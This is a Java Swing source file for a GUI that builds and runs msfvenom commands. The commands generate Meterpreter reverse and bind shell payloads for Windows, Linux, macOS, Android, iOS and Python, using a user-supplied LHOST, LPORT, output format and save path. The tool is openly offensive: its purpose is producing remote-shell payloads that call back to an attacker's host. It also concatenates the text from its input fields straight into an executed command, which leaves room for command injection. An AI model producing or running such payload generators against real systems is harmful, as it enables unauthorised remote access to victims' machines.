package com.hazeinc.src;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.InputStream;

import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;

/**
 *
 * @author artur
 */
public abstract class GUI implements ActionListener {
    
    private static JLabel savePathText;
    private static JLabel payloadsLabel;
    private static JLabel formatsLabel;
    private static JTextField savePath;
    private static JButton generatePayloadButton;
    private static JButton generateCmdButton;
    private static JComboBox payloads;
    private static JComboBox formats;
    private static JLabel output;
    private static JLabel lHostText;
    private static JTextField lHost;
    private static JLabel lPortText;
    private static JTextField lPort;
    public static String sysCommand;

    public static void main(String[] args) {
        //shit go here
    	//list containing all payloads
    	String[] payloadsString = {"windows/meterpreter_reverse_tcp","windows/meterpreter_reverse_https","windows/meterpreter_reverse_http","windows/meterpreter_bind_tcp","python/meterpreter_reverse_tcp","python/meterpreter_reverse_https","python/meterpreter_reverse_http","python/meterpreter_bind_tcp","osx/x64/meterpreter_reverse_tcp","osx/x64/meterpreter_reverse_https","osx/x64/meterpreter_reverse_http","multi/meterpreter/reverse_https","multi/meterpreter/reverse_http","linux/x64/meterpreter_reverse_tcp","linux/x64/meterpreter_reverse_https","linux/x64/meterpreter_reverse_http","android/meterpreter_reverse_tcp","android/meterpreter_reverse_https","android/meterpreter_reverse_http","apple_ios/aarch64/meterpreter_reverse_tcp","apple_ios/aarch64/meterpreter_reverse_https","apple_ios/aarch64/meterpreter_reverse_http"};
        //list containing all output formats
    	String[] formatsString = {"exe","bash","c","java","perl","powershell","python","ruby"};
    	JPanel panel = new JPanel();
        JFrame frame = new JFrame();
        frame.setSize(650,400);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.add(panel);
        
        panel.setLayout(null);
        
        savePathText = new JLabel("Save Path:");
        savePathText.setBounds(10,20,120,25);
        panel.add(savePathText);
        
        savePath = new JTextField(20);
        savePath.setBounds(120,20,300,25);
        panel.add(savePath);
        
        payloadsLabel = new JLabel("PAYLOADS:");
        payloadsLabel.setBounds(10,60,80,25);
        panel.add(payloadsLabel);
        
        payloads = new JComboBox(payloadsString);
        payloads.setBounds(120,60,300,25);
        panel.add(payloads);
        
        formatsLabel = new JLabel("FORMATS:");
        formatsLabel.setBounds(10,90,80,25);
        panel.add(formatsLabel);
        
        formats = new JComboBox(formatsString);
        formats.setBounds(120,90,80,25);
        panel.add(formats);
        
        lHostText = new JLabel("LHOST:");
        lHostText.setBounds(10,120,80,25);
        panel.add(lHostText);
        
        lHost = new JTextField();
        lHost.setBounds(120,120,150,25);
        panel.add(lHost);
        
        lPortText = new JLabel("LPORT:");
        lPortText.setBounds(10,150,80,25);
        panel.add(lPortText);
        
        lPort = new JTextField();
        lPort.setBounds(120,150,150,25);
        panel.add(lPort);
        
        generatePayloadButton = new JButton("GENERATE PAYLOAD");
        generatePayloadButton.setBounds(10,200,300,25);
        generatePayloadButton.addActionListener(new ActionListener() {
        	@Override
        	public void actionPerformed(ActionEvent e) {
        		//code for generate payload button
        		String selectedPayload = (String) payloads.getSelectedItem();
        		String selectedFormat = (String) formats.getSelectedItem();
        		String selectedSavePath = (String) savePath.getText();
        		String selectedLHOST = (String) lHost.getText();
        		String selectedLPORT = (String) lPort.getText();
        		String msfVenomCmd = ("msfvenom --payload " + selectedPayload + " LHOST=" + selectedLHOST + " LPORT=" + selectedLPORT + " --format " + selectedFormat + " --out " + selectedSavePath);
        		sysCommand = msfVenomCmd;
        		//CommandExecutor.main(args);
        		RuntimeExecutor.main(args);
        		
        		
        	}
        });
        panel.add(generatePayloadButton);
        
        output = new JLabel("");
        output.setBounds(10,240,300,25);
        panel.add(output);
        
        generateCmdButton = new JButton("Generate MSFVENOM command");
        generateCmdButton.setBounds(10,230,300,25);
        generateCmdButton.addActionListener(new ActionListener() {
        	@Override
        	public void actionPerformed(ActionEvent e) {
        		//code for generate msfvenom command button
        		String selectedPayload = (String) payloads.getSelectedItem();
        		String selectedFormat = (String) formats.getSelectedItem();
        		String selectedSavePath = (String) savePath.getText();
        		String selectedLHOST = (String) lHost.getText();
        		String selectedLPORT = (String) lPort.getText();
        		String msfVenomCmd = ("msfvenom --payload " + selectedPayload + " LHOST=" + selectedLHOST + " LPORT=" + selectedLPORT + " --format " + selectedFormat + " --out " + selectedSavePath);
        		System.out.println(msfVenomCmd);
        		
        		
        	}
        });
        panel.add(generateCmdButton);
        
        
        
        
        frame.setVisible(true); //this gotta go at the end
    }

    
}
